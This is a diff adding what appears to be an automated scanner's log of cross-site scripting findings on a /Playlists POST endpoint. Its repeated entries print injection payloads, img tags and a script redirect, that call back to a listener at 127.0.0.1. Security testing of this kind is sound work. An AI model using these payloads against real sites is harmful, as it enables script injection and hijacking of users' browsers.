@@ -1,0 +1,78 @@
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /Playlists
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='http://127.0.0.1:4444/xss/PlaylistsLLMname'>
+
+API Vul Type: xss
+Vul API Url: /Playlists
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='http://127.0.0.1:4444/xss/PlaylistsLLMname'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /Playlists
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='https://127.0.0.1:4445/xss/PlaylistsLLMname'>
+
+API Vul Type: xss
+Vul API Url: /Playlists
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <img src='https://127.0.0.1:4445/xss/PlaylistsLLMname'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /Playlists
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/PlaylistsLLMname'</script>
+
+API Vul Type: xss
+Vul API Url: /Playlists
+Vul API Method: Post
+API Vul Param: name
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/PlaylistsLLMname'</script>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /Playlists
+Vul API Method: Post
+API Vul Param: Name
+API Test Payload: <img src='http://127.0.0.1:4444/xss/PlaylistsLLMName'>
+
+API Vul Type: xss
+Vul API Url: /Playlists
+Vul API Method: Post
+API Vul Param: Name
+API Test Payload: <img src='http://127.0.0.1:4444/xss/PlaylistsLLMName'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /Playlists
+Vul API Method: Post
+API Vul Param: Name
+API Test Payload: <img src='https://127.0.0.1:4445/xss/PlaylistsLLMName'>
+
+API Vul Type: xss
+Vul API Url: /Playlists
+Vul API Method: Post
+API Vul Param: Name
+API Test Payload: <img src='https://127.0.0.1:4445/xss/PlaylistsLLMName'>
+
+-------- LLM Vul API --------
+API Vul Type: xss
+Vul API Url: /Playlists
+Vul API Method: Post
+API Vul Param: Name
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/PlaylistsLLMName'</script>
+
+API Vul Type: xss
+Vul API Url: /Playlists
+Vul API Method: Post
+API Vul Param: Name
+API Test Payload: <script>window.location='http://127.0.0.1:4444/xss/PlaylistsLLMName'</script>
+
